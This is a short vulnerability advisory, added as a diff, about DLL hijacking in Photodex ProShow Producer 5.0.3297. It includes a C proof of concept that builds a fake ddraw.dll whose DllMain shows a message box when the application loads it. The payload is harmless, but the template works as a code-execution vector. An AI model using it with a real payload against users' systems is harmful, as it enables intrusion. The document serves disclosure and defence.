@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/58131/info
+
+Photodex ProShow Producer is prone to multiple arbitrary code-execution vulnerabilities.
+
+An attacker can exploit these issues by enticing a legitimate user to use the vulnerable application to open a customized library file from application path which contains a specially crafted code. Successful exploits will compromise the application in the context of the currently logged-in user.
+
+Photodex ProShow Producer 5.0.3297 is vulnerable; other versions may also be affected. 
+
+// wine gcc -Wall -shared inject.c -o ddraw.dll
+#include <windows.h>
+
+BOOL WINAPI DllMain(HINSTANCE hInstDLL, DWORD dwReason, LPVOID lpvReserved)
+{
+    if (dwReason == DLL_PROCESS_ATTACH)
+    {
+        MessageBox(0,"DLL Injection","DLL Injection", 0);
+    }
+return TRUE;
+} 
